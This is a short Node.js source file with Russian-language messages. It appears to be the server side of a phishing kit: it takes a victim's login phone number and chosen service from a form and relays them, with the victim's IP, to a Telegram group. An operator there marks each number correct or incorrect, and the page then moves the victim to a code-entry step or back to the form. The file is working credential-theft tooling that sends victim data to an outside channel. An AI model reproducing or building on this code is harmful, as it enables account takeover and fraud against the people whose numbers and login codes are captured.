const {bot, groupID} = require('../index');

const sendRequest = async (req, res) => {
    const {number, service} = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
              [
                { text: 'Верно', callback_data: 'correct' },
                { text: 'Не верно', callback_data: 'incorrect' }
              ]
            ]
          }
      };
    bot.sendMessage(groupID,
`IP заявки: ${ip}
Сервис: ${service}
Номер телефона для входа: ${number}`,
 keyboard);
 bot.once('callback_query', (callbackQuery) => {
    const data = callbackQuery.data;
  
    if (data === 'correct') {
        bot.sendMessage(groupID, `
IP заявки: ${ip}
Номер верный, перенаправление на код`);
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send('correct');
    }
    if (data === 'incorrect') {
        bot.sendMessage(groupID, `
IP заявки: ${ip}
Номер не верный, перенаправление на повторную форму`);
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send('incorrect');
    }
});
}

module.exports = sendRequest

